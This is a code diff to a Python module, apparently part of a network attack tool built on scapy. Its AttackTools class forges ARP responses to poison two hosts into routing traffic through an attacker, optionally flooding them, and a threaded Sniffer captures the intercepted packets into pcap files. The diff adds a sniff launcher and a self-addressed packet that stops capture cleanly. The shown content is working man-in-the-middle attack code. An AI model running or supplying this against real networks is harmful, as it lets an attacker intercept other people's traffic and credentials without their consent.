@@ -1,4 +1,5 @@
 import scapy.layers.l2
+import scapy.layers.inet
 from scapy.all import *
 from DataStructures import *
 from threading import Thread
@@ -26,12 +27,12 @@ class AttackTools:
     def poison(attacker: Host, target1: Host, target2: Host, bidirectional: bool, flood: bool):
         arp1 = AttackTools.build_arp_response(attacker, target1, target2)
         if not flood:
-            sendp(arp1)
+            sendp(arp1, verbose=False)
 
         if bidirectional:
             arp2 = AttackTools.build_arp_response(attacker, target2, target1)
             if not flood:
-                sendp(arp2)
+                sendp(arp2, verbose=False)
 
         if flood:
             poisoners = [ARPPoisoner(arp1)]
@@ -43,6 +44,12 @@ class AttackTools:
 
         if flood:
             return poisoners
+
+    @staticmethod
+    def sniff(must_send: bool, interface: Interface, destination: Destination = None):
+        sniffer = Sniffer(must_send, interface, destination)
+        sniffer.begin_sniff()
+        return sniffer
 
 
 class ARPPoisoner:
@@ -79,6 +86,11 @@ class Sniffer:
 
     def kill(self):
         self.killed = True
+        pkt = scapy.layers.inet.IP()
+        pkt.dst = self.interface.get_active_hosts()[0].get_addr()
+        # The sniff function will only terminate once it receives a packet. So send a meaningless packet to self to
+        # ensure it terminates immediately.
+        send(pkt, iface=self.interface.get_name(), verbose=False)
 
     def is_killed(self):
         return self.killed
@@ -92,14 +104,20 @@ class Sniffer:
     def get_thread(self):
         return self.thread
 
-    def sniff(self, file: str, filt: str = ""):
+    def begin_sniff(self):
+        self.thread = Thread(target=self.continuous_sniff)
+        self.thread.start()
+
+    def sniff_single(self, file: str, filt: str = ""):
         if self.must_send:
             file_size_limit = 1000
         else:
             file_size_limit = 0
 
-        sniff(prn=lambda x: wrpcap(file, x, append=True), count=file_size_limit, filter=filt, stop_filter=self.killed,
-              iface=self.interface.get_name())
+        conf.iface = self.interface.get_name()
+
+        sniff(prn=lambda x: wrpcap(file, x, append=True), count=file_size_limit, filter=filt,
+              stop_filter=lambda x: self.is_killed())
 
     @staticmethod
     def gen_file_name():
@@ -128,4 +146,4 @@ class Sniffer:
         while not self.killed:
             filename = Sniffer.gen_file_name()
             self.to_send.append(filename)
-            sniff(filename, filt)
+            self.sniff_single(filename, filt)
